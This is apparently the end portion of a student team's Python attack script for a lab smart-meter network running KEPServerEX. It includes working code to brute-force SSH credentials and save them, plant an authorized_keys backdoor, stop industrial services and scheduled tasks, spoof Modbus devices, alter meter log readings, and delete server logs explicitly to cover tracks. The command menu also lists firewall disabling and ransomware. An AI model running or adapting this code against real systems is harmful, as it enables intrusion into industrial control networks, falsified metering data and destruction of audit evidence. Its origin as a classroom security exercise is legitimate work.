                                                           "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": False,
                                                           "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": False,
                                                           "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": False,
                                                           "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": False,
                                                           "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": False,
                                                           "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": False,
                                                           "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": False,
                                                           "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": False,
                                                           "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": False,
                                                           "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": False,
                                                           "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": False,
                                                           "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": False,
                                                           "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": False,
                                                           "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": False,
                                                           "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": False,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": False,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": False,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": False,
                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": False}, user_group=usergroup))

    def kep_get_all_user_groups(self):  
        server = self.kep_connect()
        print(json.dumps(admin.user_groups.get_all_user_groups(server), indent=4))

    def kep_get_single_user_group(self, usergroup):  
        server = self.kep_connect()
        print(json.dumps(admin.user_groups.get_user_group(server, usergroup), indent=4))

    ## CHANNEL AND DEVICE

    def kep_get_all_channels(self):
        server = self.kep_connect()
        print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))

    def kep_get_channel(self, channel_name):
        server = self.kep_connect()
        print(json.dumps(connectivity.channel.get_channel(server, channel_name), indent=4))

    def kep_add_spoofed_channel(self, channel_name): 
        server = self.kep_connect()
        print(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": channel_name,
                                                        "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial"}))

    def kep_del_spoofed_channel(self, channel_name):  
        server = self.kep_connect()
        print(connectivity.channel.del_channel(server, channel_name))

    def kep_modify_channel(self, channel_name, new_channel_name):  
        server = self.kep_connect()
        print(connectivity.channel.modify_channel(server, {"common.ALLTYPES_NAME": new_channel_name}, channel=channel_name, force=True))

    def kep_get_all_devices(self, channel):
        server = self.kep_connect()
        print(json.dumps(connectivity.device.get_all_devices(server, channel), indent=4))

    def kep_get_single_device(self, channel, device):  
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))

    ## SPOOFED DEVICE

    def kep_add_spoofed_device(self, channel, device):
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, channel,
                                                                         {"common.ALLTYPES_NAME": device,
                                                                          "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial",
                                                                          "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
        print("\n" + json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))

    def kep_delete_spoofed_device(self, channel, device):
        server = self.kep_connect()
        device_to_del = ".".join([channel, device])
        print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))

    def kep_modify_device(self, channel, device, new_device_name, device_id): 
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.device.modify_device(server, device_to_get, {"common.ALLTYPES_NAME": new_device_name,
                                                                      "servermain.DEVICE_ID_STRING": device_id,
                                                                      "servermain.DEVICE_ID_HEXADECIMAL": int(device_id),
                                                                      "servermain.DEVICE_ID_DECIMAL": int(device_id),
                                                                      "servermain.DEVICE_ID_OCTAL": int(device_id)}, force=True), indent=4))

    ## TAG FOR DEVICE

    def kep_get_full_tag_structure(self, channel, device): 
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.get_full_tag_structure(server, device_to_get), indent=4))

    def kep_get_single_tag(self, channel, device, tag):  
        server = self.kep_connect()
        device_to_get = ".".join([channel, device, tag])
        print(json.dumps(connectivity.tag.get_tag(server, device_to_get), indent=4))

    def kep_add_tag(self, channel, device, name, tag_address): 
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(f"device_to_get={device_to_get}, name={name}, tag_address={tag_address}")
        print(json.dumps(connectivity.tag.add_tag(server, device_to_get, {"common.ALLTYPES_NAME": name,
                                                                          "servermain.TAG_ADDRESS": tag_address}), indent=4))

    def kep_del_tag(self, channel, device, name): 
        server = self.kep_connect()
        device_to_get = ".".join([channel, device, name])
        print(json.dumps(connectivity.tag.del_tag(server, device_to_get), indent=4))

    def kep_modify_tag(self, channel, device, name, new_name):
        server = self.kep_connect()
        device_to_get = ".".join([channel, device, name])
        print(json.dumps(connectivity.tag.modify_tag(server, device_to_get, {"common.ALLTYPES_NAME": new_name}, True), indent=4))

    def kep_auto_tag_gen(self, channel, device):
        server = self.kep_connect()
        device_info = ".".join([channel, device])
        print(connectivity.device.auto_tag_gen(server, device_info, job_ttl=8))

    def kep_add_udd_profile(self, profile_name, description):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.add_profile(server, {"common.ALLTYPES_NAME": profile_name,
                                                                       "common.ALLTYPES_DESCRIPTION": description}), indent=4))

    def kep_delete_udd_profile(self, profile_name):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.del_profile(server, profile_name), indent=4))

    def kep_get_all_udd_profiles(self):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.get_all_profiles(server), indent=4))

    def kep_modify_udd_profile(self, profile_name, new_profile_name, description):
        server = self.kep_connect()
        print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": new_profile_name,
                                                                          "common.ALLTYPES_DESCRIPTION": description}, profile_name=profile_name), indent=4))
        print(json.dumps(connectivity.udd.profile.get_profile(server, new_profile_name), indent=4))
        
    def kep_add_log_group(self, log_group, description):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.add_log_group(server, {"common.ALLTYPES_NAME": log_group,
                                                                     "common.ALLTYPES_DESCRIPTION": description}), indent=4))
        
    def kep_delete_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.del_log_group(server, log_group), indent=4))

    def kep_modify_log_group(self, log_group, new_log_group, description):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.modify_log_group(server, {"common.ALLTYPES_NAME": new_log_group, "common.ALLTYPES_DESCRIPTION": description}, log_group=log_group), indent=4))

    def kep_disable_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.disable_log_group(server, log_group), indent=4))

    def kep_enable_log_group(self, log_group):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.enable_log_group(server, log_group), indent=4))

    def kep_get_all_log_groups(self):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.get_all_log_groups(server), indent=4))

    def kep_get_log_group(self, log_group_name):
        server = self.kep_connect()
        print(json.dumps(datalogger.log_group.get_log_group(server, log_group_name), indent=4))

    def disable_running_schedules(self, revert: bool=False) -> None:
        """
        Disables MoveFiles and KEPServerEX 6.12 running schedules in task scheduler

        Args:
            revert (bool): Revert the attack. If true, tasks are enabled
        """
        enable_or_disable = "/disable"
        if revert:
            enable_or_disable = "/enable"

        schedules_list = ["\MoveFiles", "\KEPServerEX 6.13"]

        state = "success"
        for schedule in schedules_list:
            command_output = self.ssh_run_command(f'schtasks /change /TN "{schedule}" {enable_or_disable}')
            if "SUCCESS:" in command_output:
                print(f"Successfully {enable_or_disable[1:]} {schedule} Tasks Scheduler")
                print("Ok.")
            else:
                state = "fail"
                print(f"Error trying to {enable_or_disable[1:]} {schedule} Tasks Scheduler")
        
        if state == "fail":
            raise Exception

    def kep_server_stop(self, revert: bool=False) -> bool:
        """
        Stops KEPServer service

        Args:
            revert (bool): Revert the attack. If true, kepserver is started

        Returns:
            bool: True/False based on whether the command `stop service` could execute or not.
        """
        def kep_server_stop_thread(service: str, services_state: list, service_index: int):
            command_output = self.ssh_run_command(f"sc query {service}")
            if "RUNNING" in command_output:
                print(f"{service} is running, stopping now...")
                command_output = self.ssh_run_command(f"sc stop {service}")

                counter = 1 # Added counter to make the UI Seem more responsive
                while any(status in command_output for status in ["STOP_PENDING", "dependent"]):
                    command_output = self.ssh_run_command(f"sc query {service}")

                    if "STOPPED" in command_output:
                        print(f"{service} has stopped!")
                        services_state[service_index] = True
                    else:
                        if "RUNNING" in command_output:
                            command_output = self.ssh_run_command(f"sc stop {service}")
                        print(f"{service} is still stopping... waiting 1 more second [{counter}]")
                        counter += 1
                        sleep(1)

            elif "STOPPED" in command_output:
                print(f"{service} has stopped!")
                services_state[service_index] = True
            else:
                print(command_output)
                print("Something went wrong!")

        if revert:
            return self.kep_server_start()
        
        services = ["KEPServerEXV6", "KEPServerEXConfigAPI6", "KEPServerEXLoggerV6"]
        services_state = [False] * len(services)
        threads = []

        for service_index, service in enumerate(services):
            thread = threading.Thread(target=kep_server_stop_thread, args=(service, services_state, service_index))
            thread.start()
            threads.append(thread)
        
        for thread in threads: thread.join()

        print("\nCollating service status for all services...")
        state = "success"
        for service_index, service in enumerate(services):
            if services_state[service_index]:
                print(f"{service} has stopped!")
            else:
                state = "fail"
                print(f"{service} has issue. Might be service not found.")
        
        if state == "fail":
            raise Exception

    def kep_server_start(self) -> bool:
        """
        Starts KEPServer service

        Returns:
            bool: True/False based on whether the command `start service` could execute or not.
        """
        def kep_server_start_thread(service: str, services_state: list, service_index: int):
            command_output = self.ssh_run_command(f"sc query {service}")

            if "STOPPED" in command_output:
                print(f"{service} has stopped, starting now...")
                command_output = self.ssh_run_command(f"sc start {service}")
                counter = 1 # Added counter to make the UI Seem more responsive
                while any(status in command_output for status in ["START_PENDING", "dependent", "1056"]):
                    command_output = self.ssh_run_command(f"sc query {service}")

                        
                    if "RUNNING" in command_output:
                        print(f"{service} is running!")
                        services_state[service_index] = True
                    else:
                        if "dependent" in command_output:
                            command_output = self.ssh_run_command(f"sc start {service}")
                        print(f"{service} is still starting up... waiting 1 more second [{counter}]")
                        counter += 1
                        sleep(1)

            elif "RUNNING" in command_output:
                print(f"{service} is running!")
                services_state[service_index] = True
            else:
                print(command_output)
                print("Something went wrong!")
                services_state[service_index] = False
        
        services = ["KEPServerEXV6", "KEPServerEXConfigAPI6", "KEPServerEXLoggerV6"]
        services_state = [False] * len(services)
        threads = []
        for service_index, service in enumerate(services):
            thread = threading.Thread(target=kep_server_start_thread, args=(service, services_state, service_index))
            thread.start()
            threads.append(thread)
        
        for thread in threads: thread.join()

        print("\nCollating service status for all services...")
        state = "success"
        for service_index, service in enumerate(services):
            if services_state[service_index]:
                print(f"{service} is running now!")
            else:
                state = "fail"
                print(f"{service} is not running.")
        
        if state == "fail":
            raise Exception

        # Functions for getting status for GUI

    def kep_get_service_status(self) -> bool:
        """
        Get KEP SERVER service status

        Returns:
            bool: True/False based on whether KEPServerEXV6 is running or not.
        """
        command_output = self.ssh_run_command('pwsh.exe -command "Get-Service KEPServerEXV6 | Select-Object -Property Status"')
        if "Running" in command_output:
            print("KEP Server Running", file=sys.__stdout__)
            return True
        else:
            print("KEP Server Not Running", file=sys.__stdout__)
        return False
    
    def kep_log_get_service_status(self) -> bool:
        """
        Get KEP LOGGER service status

        Returns:
            bool: True/False based on whether KEPServerEXLoggerV6 is running or not.
        """
        command_output = self.ssh_run_command('pwsh.exe -command "Get-Service KEPServerEXLoggerV6 | Select-Object -Property Status"')
        if "Running" in command_output:
            print("KEP Logger Running", file=sys.__stdout__)
            return True
        else:
            print("KEP Logger Not Running", file=sys.__stdout__)
        return False
    
    def kep_api_get_service_status(self) -> bool:
        """
        Get KEP API service status

        Returns:
            bool: True/False based on whether KEPServerEXConfigAPI6 is running or not.
        """
        command_output = self.ssh_run_command('pwsh.exe -command "Get-Service KEPServerEXConfigAPI6 | Select-Object -Property Status"')
        if "Running" in command_output:
            print("KEP Config API Running", file=sys.__stdout__)
            return True
        else:
            print("KEP Config API Not Running", file=sys.__stdout__)
        return False

    def get_windef_status(self) -> bool:
        """
        Get Windows Defender status

        Returns:
            bool: True/False based on whether Windows Defender is enabled or not.
        """
        command_output = self.ssh_run_command('pwsh.exe -command "Get-MpComputerStatus | select Antivirusenabled"')
        if "True" in command_output:
            print("Windows Defender Running", file=sys.__stdout__)
            return True
        else:
            print("Windows Defender Not Running", file=sys.__stdout__)
        return False

    def get_firewall_status(self):
        """
        Get Windows Firewall status

        Returns:
            str,str,str: OFF/ON based on whether Windows Firewall is enabled or not.
            List Order [Domain, Private, Public]
        """
        command_output = self.ssh_run_command(r'netsh advfirewall show allprofiles state')
        results = []

        results.append("OFF" if "OFF" in command_output.split()[5] else "ON")
        results.append("OFF" if "OFF" in command_output.split()[11] else "ON")
        results.append("OFF" if "OFF" in command_output.split()[17] else "ON")

        #print(results)
        return results

    def scp_transfer_file(self, local_full_path: str, remote_full_path: str) -> None:
        """   
        Transfer the a file remotely from host to destination machine.

        Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file

        Either a password OR a private key MUST be provided. If both are provided, the private key will be used.

        Args:
            command (str): The command to run on the remote server.
            host (str): The hostname or IP address of the remote server.
            username (str): The username to use for the SSH connection.
            password (str): The password to use for the SSH connection.
            private_key_path (str): The path to the private key file.
            local_full_path (str): The local full path of the host machine, INCLUDING THE EXTENSION NAME
            remote_full_path (str): The remote full path of the remote machine, INCLUDING THE EXTENSION NAME
        """

        # Create an SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the remote server, prioritizing private key over password
            if self.PRIVATE_KEY_PATH is not None:
                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
                # Connect using the private key
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
            if self.PASSWORD is not None:
                # Connect using password
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
            else:
                # Handle case when neither password nor private key is provided
                print("Please provide either a password or a private key.")
                return None

            # Placeholder for other code to run after successful connection
            print("Connected to the remote server.")
            # Run the command

            ssh_transport = ssh.get_transport()
            ssh_transport.default_window_size = 2147483647
            ssh_transport.packetizer.REKEY_BYTES = pow(2, 40)
            ssh_transport.packetizer.REKEY_PACKETS = pow(2, 40)
            scp = SCPClient(ssh_transport, progress4=self.progress4)
            scp.put(local_full_path, remote_path=remote_full_path)

            # Close the SCP client
            scp.close()

        except paramiko.AuthenticationException:
            print("Authentication failed. Please check your credentials.")
            return None
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {e}")
            return None
        except Exception as e:
            print(f"An error occurred: {e}")
            return None
        ssh.close()

    def transfer_exe_remotely(self, remote_path=None):
        """
        Convert this current script to exe and transfer to the specified remote_path

        Args:
            remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
        """
            
        executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"
        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", self.SCRIPT_NAME], stdout=PIPE)
        print(compiled_exe_output)

        if remote_path is None:
            remote_path = self.MODPOLL_PATH
            remote_path = path.normpath(remote_path)

        remote_full_path = path.join(remote_path, executable_name).replace("\\", "/")

        local_full_path = path.join("dist", executable_name)

        print(f"Path name is {remote_path}\\{executable_name}")
        self.scp_transfer_file(local_full_path, remote_full_path)  

    def progress4(self, filename, size, sent, peername):
        sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (
            peername[0], peername[1], filename, float(sent) / float(size) * 100))

    def ssh_brute_force(self) -> bool:
        """
        Attempts to brute force an SSH connection given a hostname, port, username, and password list file.

        Args:
            hostname (str): The hostname or IP address of the SSH server.
            username (str): The username to use for the SSH connection.
            password_file (str): The path to the password list file.

        Returns:
            bool: True if the SSH connection was successful, False otherwise.
        """

        # Create an SSH client using the Paramiko library
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Read from the password list file and save it to a list
        passwordList = []
        with open(self.PASSWORD_FILE, "r") as f:
            for line in f.readlines():
                passwordList.append(line.strip())

        # Attempt to connect to the SSH server using the username and password list
        for password in passwordList:
            try:
                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=password)
                # If the connection was successful, print the valid credentials
                print(f"[*] Found valid credentials - Username: {self.USERNAME}, Password: {password}")

                # Write the valid credentials to credentials.csv
                # If the file does not exist, create it and write the header
                try:
                    with open("resources\\credentials.csv", "x") as f:
                        f.write("username,password,service")
                except FileExistsError:
                    pass

                with open("resources\\credentials.csv", "a") as f:
                    f.write(f"\n{self.USERNAME},{password},ssh")
                    print("[*] Wrote valid credentials to credentials.csv")

                # Close the SSH connection
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                print(f"[-] Invalid credentials - Username: {self.USERNAME}, Password: {password}")
            except paramiko.SSHException as e:
                print(f"[-] Unable to establish SSH connection: {e}")
                sys.exit(1)
            except paramiko.ssh_exception.NoValidConnectionsError as e:
                print(f"[-] Unable to connect to the SSH server: {e}")
                sys.exit(1)
            except Exception as e:
                print(f"[-] Error: {e}")
                sys.exit(1)

        print("[!] Exhausted password list. Unable to find valid credentials.")
        ssh.close()
        return False

    def setup_ssh_config_and_key(self) -> bool:
        """
        Inserts an sshd_config file and an access key into a target Windows machine. Once complete, the SSH service (sshd) is restarted.
        After running, you will then be able to use the access key to SSH into the target machine.

        Args:
            hostname (str): The hostname or IP address of the target Windows machine.
            sshd_config_path (str): The path to the sshd_config file.
            access_key_path (str): The path to the access key file.

        Returns:
            bool: True if the SSH connection was successful, False otherwise.
        """

        # Create SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the target Windows machine
            ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)

            # Create SCP client
            scp = SCPClient(ssh.get_transport())

            # Copy sshd_config to the target machine using SCP
            scp.put(self.SSHD_CONFIG_PATH, remote_path='C:/ProgramData/ssh/sshd_config')

            # Copy the access key to the target machine using SCP
            scp.put(self.ACCESS_KEY_PATH, remote_path=f'C:/Users/{self.USERNAME}/.ssh/authorized_keys')

            # Close the SCP and SSH clients
            scp.close()

            # Set access rule protection and permissions on authorized_keys file using pwsh.exe
            acl_cmd = f'pwsh.exe -Command "$acl = Get-Acl \'C:\\Users\\{self.USERNAME}\\.ssh\\authorized_keys\'; $acl.SetAccessRuleProtection($true, $false); $administratorsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'Administrators\',\'FullControl\',\'Allow\'); $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\'SYSTEM\',\'FullControl\',\'Allow\'); $acl.SetAccessRule($administratorsRule); $acl.SetAccessRule($systemRule); $acl | Set-Acl"'

            ssh.exec_command(acl_cmd)

            # Restart the SSH service (sshd) using pwsh.exe
            ssh.exec_command('pwsh.exe -Command "Restart-Service sshd"')

            # Close the SSH connection
            ssh.close()

            print("Successfully inserted sshd_config and authorized_keys.")

            # Cleanup and return True
            ssh.close()
            return True

        except paramiko.AuthenticationException:
            print("Failed to authenticate to the target machine.")
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

        # Cleanup and return False
        ssh.close()
        return False

    def kep_delete_log_files(self):
        """
            Deletes the KEPServer event and transaction log files to cover up tracks.
            The default path of the log files is: C:\\ProgramData\\Kepware\\KEPServerEX\\V6
        """

        stopKEP = self.kep_server_stop()

        if stopKEP:
            # Delete log files
            log_files_to_delete = ["event.log", "transactions.log"]
            kep_default_log_folder_path = "C:\\ProgramData\\Kepware\\KEPServerEX\\V6\\"
            for log_file in log_files_to_delete:
                self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
            print("Deleted all log files!")
            # Restart KEPServer after deletion
            self.kep_server_start()
        else:
            print("Unable to delete log files as KEPServer is still running")

    def ChangeLogDataValue(self, meter_id: str):
        """
            Change the data value of the latest meter log file, in the specified meter ID's folder
            Example file path of the meter ID is: C:\\Users\\Student\\Documents\\SmartMeterData\\Meter2

            Args:
                meter_id (str): The meter ID to change the data value of
        """

        # Get File Path
        command_output = self.ssh_run_command(f"pwsh.exe -Command \"(Get-ChildItem -Path \"C:\\Users\\Student\\Documents\\SmartMeterData\\Meter{meter_id}\" | Sort-Object -Property LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName)")
        print([command_output[:-1]])

        # Command to replace 'False' with 'True' in the file
        command_replace_false = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace 'False', 'True' | Set-Content -Path \"{command_output[:-1]}\"")
        print("Replaced False with True")

        # Replace '0' with '1' in the file
        command_replace_zero = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
        print("Replaced 0 with 1")

    ########
    # MAIN #
    ########
    def main(self, cli_input):
        
        attack_option = cli_input.attack_no
        revert = cli_input.revert

        match attack_option:
            case "start": self.kep_server_start()
            case "check": self.baudrate_check()
            case "1":  self.scheduled_task_delete_files(self.SMARTMETER_PATH)
            case "3":  self.disable_firewall(revert)
            case "4":  self.disable_ssh()
            case "5":  self.kep_server_stop(revert)
            case "6":  self.run_modinterrupt(revert)
            case "7":  self.disable_COMPort(revert)
            case "8":  self.Ransom(revert)
            case "9":  self.change_meterID(revert)
            case "10": self.clear_energy_reading()
            case "12": self.kep_bruteforce()
            case "13": self.baudrate_change(revert)
            case "14": self.smartmeter_get_hardware_info()
            case "15": self.kep_server_info()
            case "16": self.kep_get_all_users()
            case "17": self.kep_enable_user("User1")
            case "18": self.kep_disable_user("User1")
            case "19": self.kep_get_single_user("User1")
            case "20": self.disable_running_schedules(revert)
            case "21": self.kep_get_all_channels()
            case "22": self.kep_get_all_devices("Channel1")
            case "23": self.kep_get_single_device("SmartMeter", "Meter1")
            case "24": self.kep_delete_spoofed_device("Channel1", "Device1")
            case "25": self.kep_add_spoofed_device("SmartMeter", "Meter1")
            case "26": self.ssh_brute_force()  # Move this up to be with the other ssh functions
            case "27": self.setup_ssh_config_and_key()  # Move this up to be with the other ssh functions
            case "28": self.kep_delete_log_files()
            case "29": self.kep_get_log_group("Derrick")
            case "30": self.ChangeLogDataValue("2_1")
            case _: print("Invalid Attack Option! Use option \"-h\" for help!")

def main():
    class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawTextHelpFormatter):
        pass
    parser = argparse.ArgumentParser(prog="python AttackScript.py", description="CLI Attack Script for the SmartMeter laptop", formatter_class=CustomFormatter,
                                    epilog=textwrap.dedent('''
                                    IS-2: Hacking A Smart Meter Network
                                    Github Link: https://github.com/ministic2001/3211_IS_Team_6
                                    Project made by:
                                        CHEW ZHI HAO TERENCE  (2102389@sit.singaporetech.edu.sg) @Terence2389
                                        CHUA YUE KAH NICHOLAS (2102785@sit.singaporetech.edu.sg) @NicholasChua
                                        EE ZONG HAN DERRICK   (2102080@sit.singaporetech.edu.sg) @Derrickeee
                                        JON TAN JUN TING      (2100787@sit.singaporetech.edu.sg) @JonTJT
                                        KEH SHAO XUAN         (2101946@sit.singaporetech.edu.sg) @ministic2001
                                    '''))

    # Positional Arguments
    parser.add_argument("attack_no", metavar="attack_option", type=str, 
                        help=textwrap.dedent('''
                        Specify the attack number based on the choices below:
                            1  Delete file
                            2  Copy file
                            3  Disable firewall
                            4  Disable ssh through firewall
                            5  Disable Kepserver service
                            6  Interrupt modbus reading
                            7  Disable COM port
                            8  Ransom
                            9  Change Meter25 Id to 26
                            10 Clear Energy Reading
                            11 Revert with options
                            12 Bruteforce KEPServer Password
                            13 Change baudrate
                            14 Get Smartmeter hardware info
                            15 Get KEP Server info
                            16 Get all KEP Server Users
                            17 Enable KEP User
                            18 Disable KEP User
                            19 Get single KEP User info
                            20 Disable running schedules
                            21 Get all KEP Channels
                            22 Get all KEP Devices
                            23 Get single KEP Device
                            24 Delete KEP Spoofed Device
                            25 Add KEP Spoofed Device
                            26 Bruteforce SSH credentials
                            27 Setup SSH Configuration and Keys
                            28 Delete KEP Log Files
                            29 Get Log Group
                            30 Change Log Data Value
                        '''))

    # Optional Arguments
    parser.add_argument("-r", "--revert", action="store_true", 
                        help=textwrap.dedent('''
                        Revert the attack. These numbers are the following revertible attacks and their effects:
                            3  Enable firewall
                            5  Enable Kepserver service
                            6  Remove modbus reading interruption
                            7  Enable COM port
                            8  Decrypt Ransomware
                            9  Change Meter26 Id back to 25
                            13 Change baudrate back to standard 9600
                            20 Enable running schedules
                        '''))
    parser.add_argument("--ip", dest="ip_address", metavar="ip_address", default="172.16.2.223", help="Specify the ip address.")
    
    parser._optionals.title = 'Optional arguments'

    cli_input = parser.parse_args()

    attack = AttackScript(cli_input.ip_address)
    attack.main(cli_input)
    
if __name__ == '__main__':
    main()
